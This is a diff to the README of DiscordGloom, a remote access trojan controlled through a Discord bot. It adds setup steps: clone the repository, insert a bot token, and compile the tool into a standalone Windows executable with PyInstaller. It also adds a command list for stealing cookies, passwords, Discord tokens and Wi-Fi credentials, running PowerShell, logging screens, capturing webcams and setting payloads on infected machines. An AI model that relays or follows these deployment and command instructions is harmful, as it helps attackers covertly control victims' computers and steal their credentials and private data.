@@ -43,16 +43,49 @@ DiscordGloom is a Discord Access Trojan (DAT) 🕵️‍♂️, a Remote Access 
 
 To use DiscordGloom, follow these steps:
 
-1. Clone or download the repository  `https://github.com/haydenbanz/DiscordGloom.git` or [DiscordGloom download](https://github.com/haydenbanz/DiscordGloom/archive/refs/heads/main.zip)).
+1. Clone or download the repository  `git clonehttps://github.com/haydenbanz/DiscordGloom.git` or [DiscordGloom download](https://github.com/haydenbanz/DiscordGloom/archive/refs/heads/main.zip)).
 2. Navigate to the DiscordGloom directory: `cd DiscordGloom`
 3. Install the required Python packages by running: `pip install -r requirements.txt`
-4. Start DiscordGloom by running: `python main.py`
-5. Check your Discord server where you added the bot for remote access.
+4. modify  ` main.py ` file [add your discord bot token]
+5. Start DiscordGloom by running: `python main.py`
+6. Check your Discord server where you added the bot for remote access.
+
+## Compline to exe
+1. Run given command in terminal  `pip install pyinstaller `
+2. Run given command in terminal  ` pip install pywin32 `
+3. Open your terminal in file dir and paste command  ` pyinstaller --onefile --add-data "*.py;." main.py ` OR `pyinstaller --onefile --exclude-module pythoncom main.py`
+
+
 
 ## 🔧 Configuration
 
 -  Configure the bot by editing the `Main.py` file.
 -  Replace with your discord token.
+
+## Commands 
+
+- !bot_help      
+- !cam_list      
+- !camic         
+- !clear         
+- !download      
+- !grab_cookies  
+- !grab_distoken 
+- !grab_password 
+- !grab_wifi     
+- !help          Shows this message
+- !kill_process  
+- !list_process  
+- !ping          
+- !powershell    
+- !rat_down      
+- !screenlogger  
+- !screenshot    
+- !set_payload   
+- !sys_info      
+- !sys_log       
+- !sys_restart   
+- !sys_shutdown  
 
 
 
